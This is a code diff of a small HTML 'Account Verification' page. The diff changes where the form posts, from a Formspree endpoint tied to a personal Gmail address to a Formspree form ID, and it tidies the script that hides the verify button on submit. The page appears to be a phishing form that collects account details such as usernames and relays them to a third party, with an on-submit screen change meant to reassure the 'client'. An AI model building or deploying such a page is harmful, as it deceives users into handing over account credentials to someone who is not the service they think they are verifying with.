@@ -17,9 +17,9 @@
 <body>
 
 <div class="form-container">
-    <h2>Verification Form</h2>
+    <h2>Account Verification</h2>
     
-    <form action="https://formspree.io/f/nayeemmagray333@gmail.com" method="POST" id="vForm">
+    <form action="https://formspree.io/f/xwvknpgb" method="POST" id="vForm">
         
         <label>Username:</label>
         <input type="text" name="Username" required>
@@ -48,13 +48,9 @@
 
 <script>
     const form = document.getElementById('vForm');
-    const btn = document.getElementById('verifyBtn');
-    const msg = document.getElementById('statusMessage');
-
     form.onsubmit = function() {
-        // This makes the screen change for the client immediately
-        btn.style.display = "none"; 
-        msg.style.display = "block"; 
+        document.getElementById('verifyBtn').style.display = "none"; 
+        document.getElementById('statusMessage').style.display = "block"; 
     };
 </script>
 
